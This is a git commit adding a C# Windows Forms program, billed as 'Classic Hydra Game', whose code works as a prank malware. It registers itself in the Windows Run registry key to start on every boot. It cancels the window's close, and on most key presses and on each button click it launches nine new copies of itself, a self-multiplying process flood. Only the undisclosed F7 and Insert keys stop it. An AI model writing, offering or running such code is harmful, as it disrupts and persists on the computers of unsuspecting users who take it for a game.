c0379f56b23e8f40183aedd17f68d6af5fad64ae
Cyt3x <44124505+Cyt3x@users.noreply.github.com>
2018-10-14 22:25:49 +0800

    Classic Hydra Game
    The Goal is to Kill the Hydra.

---
+++ Hydra/Form1.cs
@@ -0,0 +1,165 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Diagnostics;
+using Microsoft.Win32;
+
+namespace Hydra
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+            label1.Text = ("This is the monster known as Hydra! To Close this, kill it!\n                         Developed by Cyt3x");
+            this.Text = ("Hydra");
+
+            Random random = new Random();
+            int x = random.Next(1, 1250);
+            int y = random.Next(1, 700);
+
+            this.StartPosition = FormStartPosition.Manual;
+            this.Location = new Point(x, y);
+
+            RunOnStartup();
+        }
+
+        protected override bool ProcessDialogKey(Keys keyData)
+        {
+            if (Form.ModifierKeys == Keys.None && keyData == Keys.F7)
+            {
+                Environment.Exit(0);
+                return true;
+            }
+            else if (Form.ModifierKeys == Keys.None && keyData == Keys.Insert)
+            {
+                RemoveFromStartup();
+                return true;
+            }
+            else
+            {
+                for (int i = 0; i < 9; i++)
+                {
+                    var exeName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+                    ProcessStartInfo startInfo = new ProcessStartInfo(exeName);
+                    System.Diagnostics.Process.Start(startInfo);
+                }
+            }
+
+            return base.ProcessDialogKey(keyData);
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = (true);
+            for (int i = 0; i < 9; i++)
+            {
+                var exeName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+                ProcessStartInfo startInfo = new ProcessStartInfo(exeName);
+                System.Diagnostics.Process.Start(startInfo);
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            for (int i = 0; i < 9; i++)
+            {
+                var exeName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+                ProcessStartInfo startInfo = new ProcessStartInfo(exeName);
+                System.Diagnostics.Process.Start(startInfo);
+            }
+        }
+
+        public static bool RunOnStartup()
+        {
+            return RunOnStartup(Application.ProductName, Application.ExecutablePath);
+        }
+
+        public static bool RunOnStartup(string AppTitle, string AppPath)
+        {
+            RegistryKey rk;
+            try
+            {
+                rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+                rk.SetValue(AppTitle, AppPath);
+                return true;
+            }
+            catch (Exception)
+            {
+            }
+
+            try
+            {
+                rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+                rk.SetValue(AppTitle, AppPath);
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+            return true;
+        }
+
+        public static bool RemoveFromStartup()
+        {
+            return RemoveFromStartup(Application.ProductName, Application.ExecutablePath);
+        }
+
+        public static bool RemoveFromStartup(string AppTitle)
+        {
+            return RemoveFromStartup(AppTitle, null);
+        }
+
+        public static bool RemoveFromStartup(string AppTitle, string AppPath)
+        {
+            RegistryKey rk;
+            try
+            {
+                rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+                if (AppPath == null)
+                {
+                    rk.DeleteValue(AppTitle);
+                }
+                else
+                {
+                    if (rk.GetValue(AppTitle).ToString().ToLower() == AppPath.ToLower())
+                    {
+                        rk.DeleteValue(AppTitle);
+                    }
+                }
+                return true;
+            }
+            catch (Exception)
+            {
+            }
+
+            try
+            {
+                rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+                if (AppPath == null)
+                {
+                    rk.DeleteValue(AppTitle);
+                }
+                else
+                {
+                    if (rk.GetValue(AppTitle).ToString().ToLower() == AppPath.ToLower())
+                    {
+                        rk.DeleteValue(AppTitle);
+                    }
+                }
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+            return true;
+        }
+
+    }
+}
